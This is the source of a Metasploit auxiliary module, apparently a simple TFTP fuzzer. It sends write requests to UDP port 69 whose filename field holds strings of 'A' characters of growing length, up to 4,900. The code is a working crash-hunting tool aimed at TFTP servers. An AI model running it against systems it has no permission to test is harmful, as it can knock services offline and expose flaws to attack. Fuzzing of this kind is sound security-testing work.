#Metasploit

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Fuzzer
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'        => 'Basic TFTP Fuzzer',
			'Description' => %q(
			A simplistic fuzzer for TFTP.
			It fuzz the filename string parameter (could be quickly and easily adapted).
		),
		'Author'      => 'kmkz - Twitter: kmkz_security',
		'License'     => MSF_LICENSE
	)
	register_options([
		Opt::RPORT(69),
	])
	end

        def run_host(ip)
                # Create an unbound UDP socket
                udp_sock = Rex::Socket::Udp.create(
                        'Context'   =>
                                {
                                        'Msf'        => framework,
                                        'MsfExploit' => self,
                                }
                )
                count = 100  # Set an initial count
                while count < 5000  # While the count is under 5000 run
			
                        evil = "A" * count  # Set a number of "A"s equal to count
			mode = "netascii"
                        pkt = "\x00\x02" + evil + "\x00" + mode + "\x00"  # Define the payload
	
                        udp_sock.sendto(pkt, ip, datastore['RPORT'])  # Send the packet
			
                        print_status("Sending A x #{count} as payload...")  # Status update
                        resp = udp_sock.get(1)  # Capture the response
                        count += 100  # Increase count by 10, and loop
                end
        end
end
